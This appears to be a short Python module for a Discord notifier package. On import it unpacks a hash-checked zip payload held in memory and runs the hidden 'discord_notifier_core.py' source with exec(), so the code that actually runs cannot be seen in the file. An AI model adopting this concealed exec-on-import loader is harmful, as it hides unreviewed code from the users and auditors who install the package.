from pathlib import Path
import io
import zipfile

from .payload_loader import load_verified_payload

_BASE = Path(__file__).parent
_EXPECTED_SHA256 = "0b59b0d91cf9dedaf81fd23c2b16fd03f23a44a790e4c5bf80914dbcb9e4c69a"
_PAYLOAD = load_verified_payload(_BASE, _EXPECTED_SHA256)
with zipfile.ZipFile(io.BytesIO(_PAYLOAD)) as archive:
    _SOURCE = archive.read("discord_notifier_core.py").decode("utf-8")
exec(compile(_SOURCE, str(Path(__file__)), "exec"), globals(), globals())
